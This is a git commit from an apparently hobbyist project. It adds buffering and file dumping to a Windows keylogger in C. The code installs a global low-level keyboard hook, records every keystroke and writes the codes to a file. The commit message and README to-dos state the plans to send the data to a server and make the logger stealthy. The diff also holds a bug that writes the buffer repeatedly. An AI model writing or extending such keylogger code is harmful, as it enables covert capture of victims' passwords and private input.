a1ecf71c74cd1114cf7b62afadf2de21bb847044
MetrOwO <hyspa.fabio@gmail.com>
2024-12-17 13:41:32 +0100

    Ok now the keyLogger can write a file and I need to send it to a server

--- README.md
+++ README.md
@@ -2,7 +2,7 @@ To do for logger.c:
   - [ ] Socket for sending Data
   - [ ] Porting for Linux, MacOs
   - [ ] make it stealth
-
+  - [ ] If the buffer is full it calls a thread to fflush the values to the server
 To do for inputSender.c:
   - [ ] Actually idk
   - [ ] Maybe something like a rubber ducky, but I'm not sure about that
--- logger.c
+++ logger.c
@@ -1,12 +1,51 @@
-#include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#define BUFFERSIZE 256
+
+
+/*
+Thread to fflush the values to the server
+
+*/
+typedef struct{
+    int n;
+    int buffer[BUFFERSIZE];
+} BingBongBuffer;
+
 
 HHOOK hHook = NULL;
+BingBongBuffer* bingbong = NULL;
 
-// Funzione callback per catturare i tasti
+
+
+
+int writeFileDumb(char* filename){
+    FILE* fp = fopen(filename,"w+");
+    if(!fp){
+        printf("Errore lettura file");
+        return -1;
+    }
+    for(int i =0;i<BUFFERSIZE;i++) fwrite(bingbong->buffer, sizeof(int), bingbong->n, fp);
+}
+
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
+        //Bing Bong will destroy your world
+        bingbong->buffer[bingbong->n++] = (int)kbd->vkCode;
+        if(bingbong->n == BUFFERSIZE){
+            for(int i = 0;i!=BUFFERSIZE;i++){
+                printf("%c\n",bingbong->buffer[i]);
+            }
+            writeFileDumb("test.txt");
+            free(bingbong);
+            UnhookWindowsHookEx(hHook);
+            printf("Dovrei aver funzionanto");
+            exit(-1);
+        }
+        //Or maybe not
+        printf("Tasto premuto: %c\n", kbd->vkCode);
         if (kbd->vkCode == VK_ESCAPE) {
             PostQuitMessage(0); // Esci se viene premuto ESC
         }
@@ -15,9 +54,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main() {
-    printf("Premi ESC per uscire...\n");
-
-    // Installa l'hook globale
+    bingbong = (BingBongBuffer*)malloc(sizeof(BingBongBuffer));
+    bingbong->n = 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (!hHook) {
         printf("Errore nell'installazione dell'hook!\n");
@@ -30,6 +68,8 @@ int main() {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+
+    free(bingbong);
 
     // Rimuovi l'hook
     UnhookWindowsHookEx(hHook);
